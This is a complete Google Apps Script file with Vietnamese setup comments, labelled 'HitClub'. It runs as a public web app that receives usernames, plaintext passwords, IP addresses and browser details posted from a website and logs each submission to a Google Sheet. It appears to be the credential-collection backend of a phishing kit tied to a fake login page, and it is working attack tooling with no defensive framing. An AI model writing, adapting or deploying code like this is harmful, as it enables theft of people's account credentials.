/**
 * ====================================================================
 * HƯỚNG DẪN CẤU HÌNH GOOGLE APPS SCRIPT CHO HITCLUB
 * ====================================================================
 * 1. Mở một Google Sheet mới (hoặc Sheet có sẵn).
 * 2. Trên thanh menu, chọn: Tiện ích mở rộng (Extensions) > Apps Script.
 * 3. Xóa toàn bộ nội dung cũ trong trình soạn thảo, dán toàn bộ đoạn mã này vào.
 * 4. Nhấn biểu tượng "Lưu dự án" (Ctrl + S hoặc Command + S).
 * 5. Nhấn nút "Triển khai" (Deploy) ở góc trên bên phải > chọn "Triển khai mới" (New deployment).
 *    - Chọn loại triển khai (bấm icon bánh răng): Ứng dụng web (Web app).
 *    - Mô tả: HitClub Web API.
 *    - Thực thi dưới tên (Execute as): Tôi (Me - email của bạn).
 *    - Ai có quyền truy cập (Who has access): Bất kỳ ai (Anyone). *QUAN TRỌNG*
 * 6. Nhấn nút "Triển khai" (Deploy). Cấp quyền truy cập nếu Google yêu cầu.
 * 7. Sao chép "URL ứng dụng web" (kết thúc bằng /exec).
 * 8. Dán URL này vào file .env.local:
 *    GOOGLE_SHEET_URL=https://script.google.com/macros/s/.../exec
 *    NEXT_PUBLIC_SHEET_URL=https://script.google.com/macros/s/.../exec
 * ====================================================================
 */

const SHEET_NAME = 'Sheet1';

// Header mặc định khi khởi tạo trang tính
const HEADERS = [
  'Thời gian',
  'Tên đăng nhập',
  'Mật khẩu',
  'Địa chỉ IP',
  'Thiết bị / Trình duyệt',
  'Trang gửi',
];

/**
 * Kiểm tra kết nối khi mở URL trên trình duyệt
 */
function doGet(e) {
  return ContentService.createTextOutput(
    JSON.stringify({
      status: 'ok',
      message: 'HitClub Google Apps Script đang hoạt động sẵn sàng nhận dữ liệu.',
      timestamp: new Date().toISOString(),
    })
  ).setMimeType(ContentService.MimeType.JSON);
}

/**
 * Tiếp nhận dữ liệu đăng nhập từ website
 */
function doPost(e) {
  try {
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    let sheet = ss.getSheetByName(SHEET_NAME);
    if (!sheet) {
      sheet = ss.getSheets()[0];
    }

    // Tự động thêm tiêu đề bảng nếu sheet chưa có dữ liệu
    if (sheet.getLastRow() === 0) {
      sheet.appendRow(HEADERS);
      const headerRange = sheet.getRange(1, 1, 1, HEADERS.length);
      headerRange.setFontWeight('bold');
      headerRange.setBackground('#2c3e50');
      headerRange.setFontColor('#ffffff');
      headerRange.setHorizontalAlignment('center');
      sheet.setFrozenRows(1);
    }

    // Parse dữ liệu từ client
    let data = {};
    if (e && e.postData && e.postData.contents) {
      try {
        data = JSON.parse(e.postData.contents);
      } catch (jsonErr) {
        data = e.parameter || {};
      }
    } else if (e && e.parameter) {
      data = e.parameter;
    }

    const username = data.username || '';
    const password = data.password || '';
    const ip = data.ip || '';
    const userAgent = data.userAgent || '';
    const referer = data.referer || '';
    const timeStr = data.time || Utilities.formatDate(new Date(), 'Asia/Ho_Chi_Minh', 'HH:mm:ss dd/MM/yyyy');

    if (!username && !password) {
      return ContentService.createTextOutput(
        JSON.stringify({ ok: false, message: 'Dữ liệu rỗng' })
      ).setMimeType(ContentService.MimeType.JSON);
    }

    // Ghi một dòng mới vào Google Sheet
    sheet.appendRow([
      timeStr,
      username,
      password,
      ip,
      userAgent,
      referer,
    ]);

    return ContentService.createTextOutput(
      JSON.stringify({ ok: true, message: 'Ghi dữ liệu thành công' })
    ).setMimeType(ContentService.MimeType.JSON);
  } catch (error) {
    return ContentService.createTextOutput(
      JSON.stringify({ ok: false, error: error.toString() })
    ).setMimeType(ContentService.MimeType.JSON);
  }
}
